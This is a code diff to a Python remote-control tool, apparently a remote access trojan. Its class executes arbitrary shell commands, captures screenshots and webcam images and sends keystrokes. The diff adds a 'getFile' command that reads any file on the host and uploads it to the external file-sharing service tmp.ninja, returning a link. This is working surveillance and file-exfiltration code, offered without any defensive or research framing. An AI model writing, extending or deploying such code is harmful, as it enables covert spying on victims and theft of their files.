@@ -3,6 +3,7 @@ from pathlib import Path
 from io import BytesIO
 import base64
 import json
+import requests
 import subprocess
 import websockets
 import pyautogui
@@ -11,12 +12,12 @@ import uuid
 import os
 import cv2
 
+
 class RemoteTerminal:
     def __init__(self):
         self.commands = [
-            'getScreen', 'sendKeys', 'getWebcam', 'cmdList'
+            'getScreen', 'sendKeys', 'getWebcam', 'getFile', 'cmdList'
         ]
-
 
     def exe_cmd(self, cmd) -> dict:
         cmd_list = cmd.split(' ')
@@ -27,7 +28,8 @@ class RemoteTerminal:
 
         # Execute terminal commands
         else:
-            out = subprocess.run(cmd, capture_output=True, text=True, shell=True)
+            out = subprocess.run(cmd, capture_output=True,
+                                 text=True, shell=True)
             if not out.returncode == 0:
                 return {
                     'type': 'text',
@@ -49,15 +51,14 @@ class RemoteTerminal:
             'content': cmds
         }
 
-
     def conv64(self, img) -> str:
         img_file = BytesIO()
         img.save(img_file, format='JPEG')
         img64 = base64.b64encode(img_file.getvalue())
         return img64.decode('utf-8')
-        
 
     # --- Screen Shot ---
+
     def getScreen(self, *args) -> dict:
 
         image = pyautogui.screenshot()
@@ -90,6 +91,26 @@ class RemoteTerminal:
         return {
             'type': 'text',
             'content': "Done!"
+        }
+
+
+    # --- Getting the file ---
+    def getFile(self, cmds) -> dict:
+        filename = cmds[1]
+
+        params = {
+            'output': 'text',
+        }
+
+        files = {
+            'files[]': open(filename, 'rb'),
+        }
+
+        response = requests.post('https://tmp.ninja/upload.php', params=params, files=files)
+
+        return {
+            'type': 'text',
+            'content': 'File URL: ' + response.text
         }
 
 
